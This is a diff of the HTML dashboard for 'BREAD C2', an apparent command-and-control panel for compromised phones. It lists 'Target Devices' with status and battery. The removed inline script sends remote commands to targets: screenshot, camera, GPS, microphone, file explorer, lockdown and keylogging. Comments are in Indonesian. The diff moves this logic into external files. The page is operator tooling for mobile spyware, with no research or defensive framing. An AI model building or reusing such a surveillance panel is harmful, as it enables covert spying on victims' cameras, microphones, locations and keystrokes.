@@ -3,184 +3,59 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>BREAD C2 — Control Panel</title>
+    <title>BREAD C2 - Dashboard</title>
     <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
     <link href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.11.0/font/bootstrap-icons.css" rel="stylesheet">
     <script src="https://cdn.jsdelivr.net/npm/chart.js"></script>
-    <style>
-        body { background: #0a0e17; color: #c8d6e5; font-family: 'Segoe UI', monospace; }
-        .navbar { background: #0d1117; border-bottom: 1px solid #1f2a3a; }
-        .card { background: #111927; border: 1px solid #1f2a3a; border-radius: 12px; }
-        .card-header { background: #0d1117; border-bottom: 1px solid #1f2a3a; }
-        .stat-card { background: #111927; border-radius: 12px; padding: 20px; border: 1px solid #1f2a3a; }
-        .stat-value { font-size: 28px; font-weight: 700; color: #00d4ff; }
-        .badge-online { background: #00d4ff; color: #000; }
-        .badge-offline { background: #4a5568; color: #a0aec0; }
-        .table-dark { background: transparent; }
-        .table-dark td, .table-dark th { border-color: #1f2a3a; }
-        .btn-primary { background: #00d4ff; border: none; color: #000; }
-        .btn-primary:hover { background: #00b8d4; }
-        .text-glow { text-shadow: 0 0 20px rgba(0,212,255,0.3); }
-        .sidebar { background: #0d1117; border-right: 1px solid #1f2a3a; min-height: 100vh; padding: 20px; }
-        .sidebar .nav-link { color: #8a9bb5; }
-        .sidebar .nav-link.active { color: #00d4ff; background: #1f2a3a; border-radius: 8px; }
-        .terminal { background: #000; color: #00ff41; padding: 15px; border-radius: 8px; font-family: monospace; font-size: 13px; }
-    </style>
+    <link rel="stylesheet" href="css/style.css">
 </head>
 <body>
-
-<div class="container-fluid">
-    <div class="row">
-        <!-- SIDEBAR -->
-        <div class="col-md-2 sidebar">
-            <h4 class="text-glow mb-4"><i class="bi bi-cpu"></i> BREAD C2</h4>
-            <nav class="nav flex-column">
-                <a class="nav-link active" href="#"><i class="bi bi-grid"></i> Dashboard</a>
-                <a class="nav-link" href="#"><i class="bi bi-phone"></i> Targets</a>
-                <a class="nav-link" href="#"><i class="bi bi-terminal"></i> Commands</a>
-                <a class="nav-link" href="#"><i class="bi bi-file-earmark-text"></i> Logs</a>
-                <a class="nav-link" href="#"><i class="bi bi-gear"></i> Settings</a>
-                <hr style="border-color:#1f2a3a;">
-                <a class="nav-link text-danger" href="#"><i class="bi bi-box-arrow-right"></i> Logout</a>
-            </nav>
-        </div>
-
-        <!-- MAIN -->
-        <div class="col-md-10 p-4">
-            <div class="d-flex justify-content-between align-items-center mb-4">
+    <div class="container-fluid">
+        <div class="row">
+            <div class="col-md-2 sidebar">
+                <h4 class="text-glow"><i class="bi bi-cpu"></i> BREAD C2</h4>
+                <nav class="nav flex-column">
+                    <a class="nav-link active" href="dashboard.html"><i class="bi bi-grid"></i> Dashboard</a>
+                    <a class="nav-link" href="target.html"><i class="bi bi-phone"></i> Targets</a>
+                    <a class="nav-link" href="#"><i class="bi bi-terminal"></i> Commands</a>
+                    <a class="nav-link" href="#"><i class="bi bi-file-earmark-text"></i> Logs</a>
+                    <a class="nav-link" href="#"><i class="bi bi-gear"></i> Settings</a>
+                    <hr style="border-color:#1f2a3a;">
+                    <a class="nav-link text-danger" href="#" onclick="logout()"><i class="bi bi-box-arrow-right"></i> Logout</a>
+                </nav>
+            </div>
+            <div class="col-md-10 p-4">
                 <h3><i class="bi bi-activity text-glow"></i> Control Dashboard</h3>
-                <span class="badge bg-success">🟢 System Active</span>
-            </div>
-
-            <!-- STATS -->
-            <div class="row g-3 mb-4">
-                <div class="col-md-3"><div class="stat-card"><span>Total Targets</span><div class="stat-value" id="totalTargets">0</div></div></div>
-                <div class="col-md-3"><div class="stat-card"><span>Online</span><div class="stat-value text-success" id="onlineTargets">0</div></div></div>
-                <div class="col-md-3"><div class="stat-card"><span>Offline</span><div class="stat-value text-secondary" id="offlineTargets">0</div></div></div>
-                <div class="col-md-3"><div class="stat-card"><span>Commands Executed</span><div class="stat-value text-warning" id="totalCommands">0</div></div></div>
-            </div>
-
-            <!-- CHART -->
-            <div class="row g-3 mb-4">
-                <div class="col-md-6">
-                    <div class="card">
-                        <div class="card-header">Activity Chart</div>
-                        <div class="card-body"><canvas id="activityChart" height="150"></canvas></div>
+                <div class="row g-3 mb-4">
+                    <div class="col-md-3"><div class="stat-card"><span>Total Targets</span><div class="stat-value" id="totalTargets">0</div></div></div>
+                    <div class="col-md-3"><div class="stat-card"><span>Online</span><div class="stat-value text-success" id="onlineTargets">0</div></div></div>
+                    <div class="col-md-3"><div class="stat-card"><span>Offline</span><div class="stat-value text-secondary" id="offlineTargets">0</div></div></div>
+                    <div class="col-md-3"><div class="stat-card"><span>Commands</span><div class="stat-value text-warning" id="totalCommands">0</div></div></div>
+                </div>
+                <div class="row g-3 mb-4">
+                    <div class="col-md-6">
+                        <div class="card"><div class="card-header">Activity Chart</div><div class="card-body"><canvas id="activityChart" height="150"></canvas></div></div>
+                    </div>
+                    <div class="col-md-6">
+                        <div class="card"><div class="card-header">Recent Commands</div><div class="card-body"><div class="terminal" id="recentCommands">[system] Waiting...</div></div></div>
                     </div>
                 </div>
-                <div class="col-md-6">
-                    <div class="card">
-                        <div class="card-header">Recent Commands</div>
-                        <div class="card-body"><div class="terminal" id="recentCommands">[system] Waiting for commands...</div></div>
+                <div class="card">
+                    <div class="card-header d-flex justify-content-between">
+                        <span><i class="bi bi-phone"></i> Target Devices</span>
+                        <span><i class="bi bi-arrow-repeat" onclick="loadTargets()"></i></span>
                     </div>
-                </div>
-            </div>
-
-            <!-- TARGET LIST -->
-            <div class="card">
-                <div class="card-header d-flex justify-content-between">
-                    <span><i class="bi bi-phone"></i> Target Devices</span>
-                    <span><i class="bi bi-arrow-repeat" onclick="loadTargets()"></i></span>
-                </div>
-                <div class="card-body p-0">
-                    <table class="table table-dark table-hover mb-0" id="targetTable">
-                        <thead><tr><th>Device</th><th>UUID</th><th>Model</th><th>Status</th><th>Battery</th><th>Last Seen</th><th>Action</th></tr></thead>
-                        <tbody id="targetBody"></tbody>
-                    </table>
+                    <div class="card-body p-0">
+                        <table class="table table-dark table-hover mb-0">
+                            <thead><tr><th>Device</th><th>UUID</th><th>Model</th><th>Status</th><th>Battery</th><th>Last Seen</th><th>Action</th></tr></thead>
+                            <tbody id="targetBody"></tbody>
+                        </table>
+                    </div>
                 </div>
             </div>
         </div>
     </div>
-</div>
-
-<script>
-    const API_URL = 'https://localhost:8443'; // Ganti dengan IP/domain panel
-    let token = localStorage.getItem('token');
-
-    // ================================================================
-    // LOGIN — Redirect if no token
-    // ================================================================
-    if (!token) {
-        const u = prompt('Username:');
-        const p = prompt('Password:');
-        fetch(API_URL + '/api/login', {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({ username: u, password: p })
-        })
-        .then(r => r.json())
-        .then(d => {
-            if (d.token) {
-                localStorage.setItem('token', d.token);
-                location.reload();
-            } else alert('Login failed');
-        });
-    }
-
-    // ================================================================
-    // LOAD TARGETS
-    // ================================================================
-    async function loadTargets() {
-        const res = await fetch(API_URL + '/api/targets', {
-            headers: { 'Authorization': `Bearer ${localStorage.getItem('token')}` }
-        });
-        const data = await res.json();
-        
-        const body = document.getElementById('targetBody');
-        body.innerHTML = '';
-        
-        let online = 0, offline = 0;
-        
-        data.forEach(t => {
-            const status = t.status === 'online' ? 'online' : 'offline';
-            if (status === 'online') online++; else offline++;
-            
-            const row = document.createElement('tr');
-            row.innerHTML = `
-                <td><i class="bi bi-phone"></i> ${t.device_name || 'Unknown'}</td>
-                <td><small>${t.uuid.substring(0,12)}...</small></td>
-                <td>${t.model || 'N/A'}</td>
-                <td><span class="badge badge-${status}">${status.toUpperCase()}</span></td>
-                <td>${t.battery || 0}%</td>
-                <td>${t.last_seen || 'Never'}</td>
-                <td><button class="btn btn-sm btn-primary" onclick="controlTarget('${t.uuid}')"><i class="bi bi-joystick"></i></button></td>
-            `;
-            body.appendChild(row);
-        });
-
-        document.getElementById('totalTargets').innerText = data.length;
-        document.getElementById('onlineTargets').innerText = online;
-        document.getElementById('offlineTargets').innerText = offline;
-    }
-
-    // ================================================================
-    // CONTROL TARGET (Popup)
-    // ================================================================
-    function controlTarget(uuid) {
-        const cmd = prompt(`Commands for ${uuid}:\n[1] Screenshot\n[2] Camera\n[3] GPS\n[4] Mic\n[5] File Explorer\n[6] Lockdown\n[7] Keylog\n\nEnter command number:`);
-        if (!cmd) return;
-        const commands = ['screenshot', 'camera', 'gps', 'mic', 'file_explorer', 'lockdown', 'keylog'];
-        const selected = commands[parseInt(cmd)-1];
-        if (!selected) return alert('Invalid command');
-        
-        fetch(API_URL + '/api/command', {
-            method: 'POST',
-            headers: {
-                'Content-Type': 'application/json',
-                'Authorization': `Bearer ${localStorage.getItem('token')}`
-            },
-            body: JSON.stringify({ target_uuid: uuid, command: selected, params: {} })
-        })
-        .then(r => r.json())
-        .then(d => alert(`Command sent! ID: ${d.command_id}`));
-    }
-
-    // ================================================================
-    // INIT
-    // ================================================================
-    loadTargets();
-    setInterval(loadTargets, 15000); // Refresh setiap 15 detik
-</script>
-
+    <script src="js/app.js"></script>
+    <script type="module" src="js/app.js"></script>
 </body>
 </html>
